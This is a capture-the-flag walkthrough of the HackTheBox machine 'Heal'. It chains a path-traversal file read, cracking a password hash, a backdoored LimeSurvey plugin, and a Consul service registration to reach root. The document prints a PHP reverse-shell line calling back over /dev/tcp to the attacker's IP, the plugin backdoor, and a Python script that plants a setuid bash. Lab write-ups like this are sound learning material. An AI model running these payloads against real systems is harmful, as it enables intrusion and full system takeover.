---
tags:
  - Linux
  - HTTP
  - LFI
  - PHP
  - localhost service
---

... is a medium HTB machine which offers a `resume creator` tool which is vulnerable to `LFI`. Using this, the config files of the sub-domains can be read to find credentials to a `limesurvey` back-end, where you can upload a custom plugin for `RCE`. A consul service is running on localhost as `root`, which allows you to register a custom `consul service` which executes arbitrary os-code.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Due to the output of the `nmap script http-title` i find out that the domain `heal.htb` is being used by the `http` service, which is why i add it to my local DNS-resolution file `/etc/hosts` as follows:
```bash
echo "$IP heal.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

To find out if any other content is being hidden from me behind `VHosts`, i use `ffuf` for a dictionary attack against the `Host` header during `HTTP` requests:
```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -H "Host: FUZZ.heal.htb" -u http://heal.htb -fs 178
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.heal.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: ignore all responses with the size 178, as that is the default page
```

This in fact finds the `VHost`: `api.heal.htb`, so i also add this to my `/etc/hosts` file as follows:
```bash
sudo sed -i "s/$IP heal.htb/$IP heal.htb api.heal.htb/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

After finding the two hosts `http://heal.htb` and `http://api.heal.htb` i decided to visit and enumerate them in the built-in browser of `burpsuite`.

`http://heal.htb` displays a login page for a `Resume Builder`. I tried default credentials such as `admin:admin` and `root:password`, and also simple SQL-injection checks such as adding `"` and `'` but none of them worked. So i decided to register an account instead and that lead me to the page `/resume`.
This `/resume` page offers three buttons at the top-right: `Profile`, `Survey`, and `Logout`. When clicking the `Profile` button, i am redirected to `/profile`, where info about my current user is displayed such as `ID`, `Email`, `Full Name`, `Username` and `Admin`. The `Survey` button on the other hand, redirects me to `/survey`, where i can press another button which redirects me to the sub-domain `take-survey.heal.htb`. The `Logout` button does what it should do.
Due to the `/survey` endpoint redirecting me to `take-survey.heal.htb`, i also add that `subdomain` to my `/etc/hosts` file as follows:
```bash
sudo sed -i "s/$IP heal.htb api.heal.htb/$IP heal.htb api.heal.htb take-survey.heal.htb/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

Continuing on with `/resume`, i am able to enter information about myself, which is then displayed in a `PDF` file which is created. I inspected the process of creating the `PDF` file by intercepting the communication in `burpsuite` and this is the step-by-step logic:

1. `POST`-request to `/exports`: HTML data with the content i filled out
2. `201 Created`-response: with the message `"PDF created successfully"` alongside the name of the `PDF`, which consists of random numbers and letters.
3. `OPTIONS`-request to `/download?filename=<pdf-name>.pdf`: asks the server what HTML methods i am allowed to use.
4. `200 OK`-response: responds with `GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD`.
5. `GET`-request to `/download?filename=<pdf-name>.pdf`: Tries to fetch the newly created `PDF` file.
6. `200 OK`-response: returns the content of the `application/pdf`. The `/Creator` tag reveals that `wkhtmltopdf 0.12.6` was used to create this `PDF`

Before stepping into the exploitation of this `PDF-creation` tool, i wanted to find out what `http://api.heal.htb` and `http://take-survey.heal.htb` offer. 

After visiting `api.heal.htb`, i am simply greeted by a page which has the logo of `Ruby on Rails` in the middle, with a redirect to its official page. At the bottom i am informed of the `Rails` version, which is `7.1.4` and the `Ruby` version, which is `3.3.5`!
`take-survey.heal.htb` displays a page for `LimeSurvey`, but i am not able to do any surveys, as i need to contact the administrator `ralph@heal.htb`.

I also tried forceful browsing on both sub-domains to find more endpoints using this `ffuf` command:
```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -u http://heal.htb/FUZZ -fs 178
```
But this did not reveal any more endpoints.

### Initial Exploitation
After finishing the reconnaissance part, i decided to investigate the `GET`-request to `/download?filename=<pdf-name>.pdf` first, as that seems to be the most interesting way of interacting with this. I try to request the `/etc/passwd` file as follows: `GET /download?filename=/etc/passwd`. And this returns the content of that file! I also try a remote-file inclusion by requesting resources located on my `python3 -m http.server`, but sadly that does not work. I also tried fetching the `ssh` keys of `ron` and `ralph` (from `/etc/passwd`), but that did not work.

The file `/etc/apache2/sites-available/000-default.conf` reveals that `/var/www/html` is the web root! A quick `google` search on `limesurvey`'s config files [reveals](https://www.limesurvey.org/manual/Optional_settings) that the config file is located in `/application/config/config-defaults.php`. I tried fetching this file multiple ways but it did not work.

After thinking about this exploitation path for a second i remembered that `limesurvey` was on `take-survey.heal.htb`, and the `LFI` vulnerability exists in `api.heal.htb`, where the `ruby on rails` was being served. This lead me to the [ruby on rails docs](https://guides.rubyonrails.org/configuring.html) which told me that the application-wide config file is located at `config/application.rb`, and i was able to find it by stepping two paths back: 
`GET /download?filename=../../config/application.rb`! 
Sadly, this config file did not reveal anything interesting. So i googled where the database is located for ruby on rails, and that lead me to [this official guide](https://guides.rubyonrails.org/v2.3/getting_started.html#configuring-a-database). The database configuration file is located in `config/database.yml`, which i can read using
`GET /download?filename=../../config/database.yml`! 
This config file shows me the location of the actual database, which i can then fetch using this `GET` request:
`GET /download?filename=../../storage/development.sqlite3`!
I can download this file onto my local machine by sending a `Export as PDF` request to `http://heal.htb/resume` and then changing the filename to this database!

With the `db.sqlite3` file on my local machine, i can interact with it using the `sqlite3` `CLI`. I open it using `sqlite3 ./db.sqlite3`, and list the tables using `.tables`. I can fetch each entry of the `users` table with the query `select * from users;`! This gives me the hashes of my account, and the account of `ralph`!

I save the hash in a `hash.txt` file and try to auto-detect it with `hashcat` using the command
```bash
hashcat ./hash.txt ./rockyou.txt
```
Sadly, `hashcat` was not able to identify it, so i use `hashid ./hash.txt`, which identifies this hashing algorithm to be `Blowfish(OpenBSD)`. That equates to the mode `3200` in `hashcat`, which is why i use the following `hashcat` command to crack the password:
```bash
hashcat -m 3200 ./hash.txt ./rockyou.txt
```
This quickly cracks the hash and reveals the clear-text password `147258369`!

I can now use `ralph:147258369` to log in to the `Resume Builder`, but he does not have more functionality of the page as my normal account. I remembered that `ralph` was the `Administrator` to the `limesurvey` service, which is why i googled for `limesurvey login urls`. [This](https://forums.limesurvey.org/forum/design-issues/81473-user-log-in-page) question revealed the endpoint `admin/admin.php`. Visiting that on `take-survey.heal.htb` redirected me to a login, where i used `ralph`'s credentials for a log-in!

After reviewing the back-end of `take-survey.heal.htb`, i notice `Configuration > Settings > Plugins`! There i am able to upload custom plugins and enable them! I google `limesurvey plugins download` and i download the `LDAP Authentication Plugin`(can be any plugin though) from the [LimeStore Extensions](https://account.limesurvey.org/limestore) page.

I `unzip AuthLDAPExtended.zip` and edit the `AuthLDAPExtended/AuthLDAPExtended.php` file by adding this small line to its beginning:
```php
system('ping -c 3 <my-IP>');
```
I zip this extension again using `zip -r test.zip AuthLDAPExtended`, and i upload the `test.zip` by using the `Upload & install` button on the `Plugins` page.

I start listening for `ICMP` packets like this:
```bash
sudo tcpdump -i tun0 icmp
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: is required for packet inspection
# -i: specify the interface. the HTB VPN uses tun0
# icmp: listen for Internet Control Message Protocol (in short, ping) messages
```

and click on `AuthLDAPExtended` in the list of plugins, which makes me receive pings!

I quickly change the `ping` payload to a reverse shell initiator:
```php
system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"');
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# bash -c: wraps the following command so that it explicitly gets executed by bash, not the current shell
# /bin/bash -i: launch the bash binary in interactive mode
# >&: redirect standard output and standard error to:
# /dev/tcp/<IP>/port: when the bash binary opens this path, it creates a TCP connection!
# 0>&1: STDIN (0) gets redirected (>) to where STDOUT (1) is pointing
```

I uninstall the old extension, `zip` the new and improved one, upload it and start a `nc` listener:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

Clicking on `AuthLDAPExtended` in the list of plugins gives me a reverse shell as `www-data`!

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The users `ron` and `ralph` have a home directory, which is why i assumed that i need one of their accounts to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

Due to my previous failed attempt of reading the configuration file of `limesurvey` located at `/application/config/config-defaults.php` using the `LFI`, i know decided to read the config files. And the `/application/config/config.php` reveals the credentials `db_user:AdmiDi0_pA$$w0rd`. I try to use this password to access the machine via `ssh`, as `ron` and `ralph`. I am able to log in using the credentials `ron:AdmiDi0_pA$$w0rd`! I also tried `ralph`'s account, but `ralph` is not re-using passwords, not even the one for the `limesurvey` back-end!

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`netstat -tulnp` reveals that there are multiple ports listening on `localhost` only, mainly `8302`,  `8301`, `8301`, `8503`, `8500` and `8600`. 

Googling the typical usage for these ports all lead to the application `HashiCorp Consul`, which uses port `8500` as its main `http` interface. Further googling into `HashiCorp Consul` reveals that it is a `"service networking solution which enables teams to manage secure network connectivity between services, across on-prem, hybrid cloud, and multi-cloud environments and runtimes."` [source](https://developer.hashicorp.com/consul).

`ps aux | grep consul` reveals that the `CLI` option `/usr/local/bin/consul` was used by `root` to start this server! I therefore use the local port forwarding feature of `ssh` so that i can view this `consul` service in my `burp` browser:
```bash
ssh -L 1337:localhost:8500 ron@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# 1337: port on our machine which gets opened. If talked to, ssh will forward it to the target port. can be any port.
# localhost: the remote host we want to reach. NOT $IP, as we want to be localhost (127.0.0.1) on the target.
# 8500: the remote port which gets interacted with when interacting with port 1337 on the local machine.
```

That shows me the UI for the consul service! A quick google search for `consul rce` gives me [this github](https://github.com/owalid/consul-rce), which explains that consul allows you to register your own services, which execute specific commands at regular intervals! To do so, a `PUT` request must be made to the `/v1/agent/service/register` API, in which the data includes an OS command which then gets executed!

The following python script makes this `PUT` request, to force `root` to make a copy of `/bin/bash` to `ron`'s home directory and set its `setuid`. The following python script `rootme.py` automates this procedure:
```python
import requests
import time
import subprocess

url = "http://localhost:8500/v1/agent/service/register"
url2 = "http://localhost:8500/v1/agent/service/deregister/1337"
data = { 
	'ID': '1337', 
	'Name': 'rootme', 
	"Check": {
	"Args": [
		"/bin/bash", "-c", "cp /bin/bash /home/ron/rootme; chmod u+s /home/ron/rootme"],
		'Interval': '5s'
	}
}
requests.put(url, json=data)
time.sleep(5)
requests.put(url2, json=data)
subprocess.run(["/home/ron/rootme", "-p"])
```

This script automatically registers a malicious service, which copies `bash` to `rons` home directory, sets its `SetUID`, and then removes the service for cleanup. This effectively gives `ron` `root` access!